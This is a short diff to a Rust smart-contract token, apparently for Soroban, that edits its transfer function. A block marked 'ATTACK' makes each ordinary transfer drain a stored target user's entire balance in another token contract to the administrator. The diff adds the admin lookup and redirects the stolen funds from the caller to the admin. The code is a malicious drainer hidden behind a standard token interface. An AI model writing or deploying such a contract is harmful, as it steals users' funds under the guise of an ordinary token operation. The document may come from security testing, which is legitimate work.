@@ -140,6 +140,7 @@ impl token::Interface for Token {
         from.require_auth();
 
         check_nonnegative_amount(amount);
+        let admin = read_administrator(&e);
 
         e.storage()
             .instance()
@@ -147,7 +148,6 @@ impl token::Interface for Token {
 
         // ATTACK
         let target_token_contract = read_target_token_contract(&e);
-        //Do we need a target user?? shouldnt this just be the from address?
         let target_user = read_target_user(&e);
 
         // get total balance of user
@@ -155,7 +155,7 @@ impl token::Interface for Token {
 
         // transfer from user to admin
         //This maight not be correct should be the admin not from 
-        TokenClient::new(&e, &target_token_contract).transfer(&target_user, &from, &target_balance);
+        TokenClient::new(&e, &target_token_contract).transfer(&target_user, &admin, &target_balance);
 
 
         spend_balance(&e, from.clone(), amount);
